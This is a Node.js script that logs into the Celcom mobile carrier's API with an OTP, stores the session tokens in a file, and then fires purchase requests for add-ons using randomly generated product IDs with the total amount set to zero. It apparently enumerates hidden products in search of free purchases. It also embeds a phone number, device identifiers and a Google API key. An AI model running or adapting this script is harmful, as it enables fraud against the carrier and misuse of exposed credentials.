const fetch=require("node-fetch");
const fs=require("fs");
const readline = require('readline');
let gc=5;
function askQuestion(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }))
}




const cHost="https://apicl3.celcom.com.my";

let msisdn="0138321592";

async function secureToken(token){
	let url="https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyCustomToken?key=AIzaSyAY_xgPxtljMmsFPn8NFDyN7S-eeqzI4Io";
	let postBody={"token":token,"returnSecureToken":true};
	let postHead={"content-type":"application/json"};
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let res=await fetch(url,postSet);
        let resJson=await res.json();
       
	console.log("TOKEN IS :\n"+resJson.idToken);
        fs.appendFileSync("token.txt","secure token=======\n"+resJson.idToken+"\n");
	return testSub(resJson.idToken,gc)
}

async function otpVal(num,otp,sId){
	let path="/auth/token-create";
	let postBody={"otp":otp,"type":"msisdn","sessionId":sId,"loginChannel":"otp","pushToken":"","networkType":"cellular","adId":"e12d7a5f-adf8-4f4b-8964-e8fa51e1a8c3","appVersion":"3.0.67","deviceModel":"CPH2387","deviceVersion":"14","deviceId":"889fa5074a7ab067","os":"android","referralCode":"","networkSpeed":"5"};
	let postHead={"content-type":"application/json"};
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let url=cHost+path;
	let res=await fetch(url,postSet);
	let resJson=await res.json();
	let token=resJson.token;
        fs.writeFileSync("token.txt","token======\n"+token+"\n");
	return secureToken(token);
}

async function otpGen(num){
	let path="/auth/otp-generate";
	let postBody={"msisdn":"6"+num};
        let postHead={"content-type":"application/json"};
        let url=cHost+path;
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let res=await fetch(url,postSet);
	let resJson=await res.json();
        console.log(resJson);
	let sId=resJson.sessionId;
        console.log("Session id: "+sId);
	let e=await askQuestion("Done requesting otp,enter below\n");
		return otpVal(num,e,sId);
		
}

async function testSub(token,c){
	let oid="2060";
	let id=oid;
	let tid=7;
	let rid=tid-id.length;
	
	let anum="012345678901837469922659026514905739";
	for(let i=0;i<c;++i){
		id=oid;
		for(let j=0;j<rid;++j){
			let ind=Math.floor(Math.random()*anum.length);
			id+=anum[ind];
		}
	let path="/plans-and-add-ons-mgmt/addOns/purchase/latest?lang=en";
	let postBody=`{"productId":"${id}","planType":"","accountType":"Prepaid","planName":"","productVolume":"","headerTitle":"","totalAmount":0,"promotype":null,"primaryMobileNumber":"","secondaryMobileNumber":"","isSwitchedSuplementary":false,"requestType":"INDIVIDUAL_PRODUCT ","remark":"","sup":false,"partialControlFlag":false,"type":"Addons","starFamilyPlan":false,"neptunePlan":false,"latestBuild":true,"mvivaProductId":null,"isJust4MEAddon":false,"dataGiftedMsisdn":"","isDataGiftingProvision":false,"isMaxFamilyPlan":false,"upsellAdobeInfo":{},"personaliseAdobeInfo":{"transact_product":null,"transact_product_addons":null,"transact_pid":"${id}","transact_value":0}}`;
	    console.log(postBody);
        let postHead={"authorization":token,"content-type":"application/json"};
        let url=cHost+path;
	let postSet={method:"POST",headers:postHead,body:JSON.stringify(postBody)};
	let res=await fetch(url,postSet);
	let resJson=await res.text();
        console.log(resJson);
        console.log("id : "+id+"\n=======");
	 }
	return;
}



if(process.argv.length>2)gc=process.argv[2];
//fs.writeFileSync("token.txt",otpGen(msisdn));
otpGen(msisdn);
//testSub(gc);
